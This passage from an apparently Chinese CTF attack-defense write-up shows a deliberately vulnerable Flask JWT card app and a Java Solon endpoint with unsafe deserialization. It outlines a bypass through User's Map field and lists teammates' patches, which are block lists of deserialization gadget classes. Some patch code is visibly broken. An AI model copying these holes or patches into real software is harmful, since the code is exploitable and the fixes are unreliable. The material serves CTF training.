<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/showCard&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_card</span>():</span><br><span class="line">    token = request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    data = jwt.decode(token, rsakey.publickey().exportKey(), algorithms=jwt.algorithms.get_default_algorithms())</span><br><span class="line">    blacklists = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;|&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklists:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data[<span class="string">&#x27;avatar&#x27;</span>] <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> data[<span class="string">&#x27;avatar&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> safer_render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line">    info = Info(**data)</span><br><span class="line"></span><br><span class="line">    info.parse_avatar()</span><br><span class="line">    blacklists2 = [<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklists2:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> info.name <span class="keyword">or</span> i <span class="keyword">in</span> info.signature:</span><br><span class="line">            <span class="keyword">return</span> safer_render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> safer_render_template(<span class="string">&quot;show.html&quot;</span>, info=info)</span><br></pre></td></tr></table></figure>

<p>还有加盐的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/createCard&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_card</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> safer_render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;style&#x27;</span>)!=<span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&#x27;templates/style.css&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(request.form.get(<span class="string">&#x27;style&#x27;</span>))</span><br><span class="line">    info=Info(**&#123;<span class="string">&#x27;name&#x27;</span>:request.form[<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27;avatar&#x27;</span>:request.form[<span class="string">&#x27;avatar&#x27;</span>],<span class="string">&#x27;signature&#x27;</span>:request.form[<span class="string">&#x27;signature&#x27;</span>],<span class="string">&#x27;salt&#x27;</span>:<span class="built_in">str</span>(os.urandom(<span class="number">100</span>))&#125;)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> info.name+info.avatar+info.signature <span class="keyword">or</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> info.name+info.avatar+info.signature:</span><br><span class="line">        <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> info.avatar <span class="keyword">not</span> <span class="keyword">in</span> os.listdir(<span class="string">&#x27;avatars&#x27;</span>):</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError</span><br><span class="line">    token = jwt.encode(<span class="built_in">dict</span>(info), rsakey.exportKey(), algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line">    share_url = request.url_root + url_for(<span class="string">&#x27;show_card&#x27;</span>, token=token)</span><br><span class="line">    qr_img = BytesIO()</span><br><span class="line">    qrcode.make(share_url).save(qr_img,<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    qr_img.seek(<span class="number">0</span>)</span><br><span class="line">    share_img = base64.b64encode(qr_img.getvalue()).decode()</span><br><span class="line">    <span class="keyword">return</span> safer_render_template(<span class="string">&quot;created.html&quot;</span>, share_url=share_url, share_img=share_img)</span><br></pre></td></tr></table></figure>

<h2 id="SolonMaster"><a href="#SolonMaster" class="headerlink" title="SolonMaster"></a>SolonMaster</h2><p>重点代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapping(&quot;/api&quot;)</span></span><br><span class="line"><span class="meta">@Post</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">api</span><span class="params">(Map map, Context ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(ctx.body());</span><br><span class="line">    <span class="keyword">if</span> (map.size() != jsonObject.length()) &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User)deserialize((String)map.get(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> user.getName();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode)) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">check</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">targetc</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.check &amp;&amp; !User.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BadAttributeValueExpException.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.check = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span> targetc;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>白名单进行过滤关键字绕过snack和log关键字绕过check</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapping(&quot;/api&quot;)</span></span><br><span class="line"><span class="meta">@Post</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">api</span><span class="params">(Map map, Context ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(ctx.body());</span><br><span class="line">    <span class="keyword">if</span> (map.size() != jsonObject.length()) &#123;</span><br><span class="line">        <span class="type">byte</span>[] decodedata =Base64.getEncoder.decode((String)map.get(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decodedata);</span><br><span class="line">        <span class="keyword">if</span> (data1.contains(<span class="string">&quot;snack&quot;</span>) &amp;&amp; data1.contains(<span class="string">&quot;log&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User)deserialize((String)map.get(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> user.getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>resolveClass 这里禁用了 BadAttributeValueExpException 并且必须为 User 的子类，也就是最外层得是 User，看下 User</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> Map info;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Map <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;getInfo&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.info;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInfo</span><span class="params">(Map info)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.info = info;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User 里面有个 Map，我们把这个Map设置成恶意的序列化数据就行了</p>
<p>雲流爷的 fix</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Post;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(value=&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">index</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;freemarker.ftl&quot;</span>);</span><br><span class="line">        model.put(<span class="string">&quot;msg&quot;</span>, (Object)<span class="string">&quot;/api&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * WARNING - Removed try catching itself - possible behaviour change.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Mapping(value=&quot;/log&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">log</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;./logs/solon.log&quot;</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String line;</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(filePath));</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line).append(System.lineSeparator());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (reader != <span class="literal">null</span>) &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Mapping(value=&quot;/api&quot;)</span></span><br><span class="line">    <span class="meta">@Post</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">api</span><span class="params">(Map map, Context ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(ctx.body());</span><br><span class="line">        <span class="keyword">if</span> (map.size() != jsonObject.length()) &#123;</span><br><span class="line">            <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User)DemoController.deserialize((String)map.get(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> user.getName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode))&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">check</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">private</span> ArrayList Blacklist=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="built_in">this</span>.Blacklist.add(Hashtable.class.getName());</span><br><span class="line">                <span class="built_in">this</span>.Blacklist.add(HashSet.class.getName());</span><br><span class="line">                <span class="built_in">this</span>.Blacklist.add(TreeMap.class.getName());</span><br><span class="line">                <span class="built_in">this</span>.Blacklist.add(BadAttributeValueExpException.class.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">                Class&lt;?&gt; targetc = <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.check &amp;&amp; !User.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (BadAttributeValueExpException.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!desc.getName().equals(<span class="string">&quot;commons.collections&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized&quot;</span>,desc.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!desc.getName().equals(<span class="string">&quot;com.alibaba.fastjson.JSON&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized&quot;</span>,desc.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.Blacklist.contains(desc.getName())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;dont do this&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.check = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span> targetc;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>光辉师傅的 fix</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span>(desc.getName().contains(<span class="string">&quot;asp&quot;</span>)||desc.getName().contains(<span class="string">&quot;javax.management&quot;</span>)||desc.getName().contains(<span class="string">&quot;AbstractTranslet&quot;</span>)||desc.getName().contains(<span class="string">&quot;Fastjson&quot;</span>)||desc.getName().contains(<span class="string">&quot;jmx&quot;</span>)||desc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||desc.getName().contains(<span class="string">&quot;java.lang&quot;</span>)||desc.getName().contains(<span class="string">&quot;com.alibaba.fastjson.JSONArray&quot;</span>)||desc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||desc.getName().contains(<span class="string">&quot;com.alibaba.fastjson&quot;</span>)||desc.getName().contains(<span class="string">&quot;javax.swing&quot;</span>)||desc.getName().contains(<span class="string">&quot;java&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">targetc</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    <span class="keyword">if</span>(targetc.getName().contains(<span class="string">&quot;asp&quot;</span>)||targetc.getName().contains(<span class="string">&quot;javax.management&quot;</span>)||targetc.getName().contains(<span class="string">&quot;AbstractTranslet&quot;</span>)||targetc.getName().contains(<span class="string">&quot;Fastjson&quot;</span>)||targetc.getName().contains(<span class="string">&quot;jmx&quot;</span>)||targetc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||targetc.getName().contains(<span class="string">&quot;java.lang&quot;</span>)||targetc.getName().contains(<span class="string">&quot;com.alibaba.fastjson.JSONArray&quot;</span>)||targetc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||targetc.getName().contains(<span class="string">&quot;com.alibaba.fastjson&quot;</span>)||targetc.getName().contains(<span class="string">&quot;javax.management&quot;</span>)||targetc.getName().contains(<span class="string">&quot;javax.swing&quot;</span>)||javax.swing.event.SwingPropertyChangeSupport.class.isAssignableFrom(targetc)||desc.getName().contains(<span class="string">&quot;java&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (BadAttributeValueExpException.class.isAssignableFrom(targetc)|| java.util.HashMap.class.isAssignableFrom(targetc)|| JSONArray.class.isAssignableFrom(targetc)|| AbstractAction.class.isAssignableFrom(targetc)|| Map.class.isAssignableFrom(targetc)|| XString.class.isAssignableFrom(targetc)|| StyledEditorKit.AlignmentAction.class.isAssignableFrom(targetc)||AbstractAction.class.isAssignableFrom(targetc)||StyledEditorKit.BoldAction.class.isAssignableFrom(targetc)||StyledEditorKit.StyledTextAction.class.isAssignableFrom(targetc)||StyledEditorKit.UnderlineAction.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.check &amp;&amp; !User.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BadAttributeValueExpException.class.isAssignableFrom(targetc)|| java.util.HashMap.class.isAssignableFrom(targetc)|| JSONArray.class.isAssignableFrom(targetc)|| AbstractAction.class.isAssignableFrom(targetc)|| Map.class.isAssignableFrom(targetc)|| XString.class.isAssignableFrom(targetc)|| StyledEditorKit.AlignmentAction.class.isAssignableFrom(targetc)||AbstractAction.class.isAssignableFrom(targetc)||StyledEditorKit.BoldAction.class.isAssignableFrom(targetc)||StyledEditorKit.StyledTextAction.class.isAssignableFrom(targetc)||StyledEditorKit.UnderlineAction.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.check = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> targetc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>crazy</p>
